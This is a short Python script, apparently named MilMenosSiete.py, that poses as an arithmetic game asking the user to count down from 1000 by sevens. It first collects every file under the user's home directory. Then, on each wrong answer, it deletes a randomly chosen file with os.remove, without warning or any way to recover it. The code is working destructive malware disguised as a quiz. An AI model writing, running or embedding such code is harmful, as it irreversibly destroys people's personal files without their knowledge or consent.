import os
import random

x = 1000

def start(x):

    ruta_usuario = os.path.expanduser("~")
    archivos_encontrados = []

    for directorio_raiz, directorios, archivos in os.walk(ruta_usuario):
        for archivo in archivos:
            ruta_archivo = os.path.join(directorio_raiz, archivo)
            if archivo == "MilMenosSiete.py":
                continue
            else:
                archivos_encontrados.append(ruta_archivo)

    while x >= 6:
        resta = x - 7
        answr = int(input(f"¿Cuánto es {x} - 7?: "))
        while answr != resta:
            answr=int(input(f"Error, ¿cuánto es {x} - 7?: " ))
            if answr == resta:
                break
            else:
                try:

                    archivo_aleatorio = random.choice(archivos_encontrados)
                    print(f"Archivo removido: {archivo_aleatorio}")
                    os.remove(archivo_aleatorio)
                    

                except:
                    continue
        x = resta

start(x)
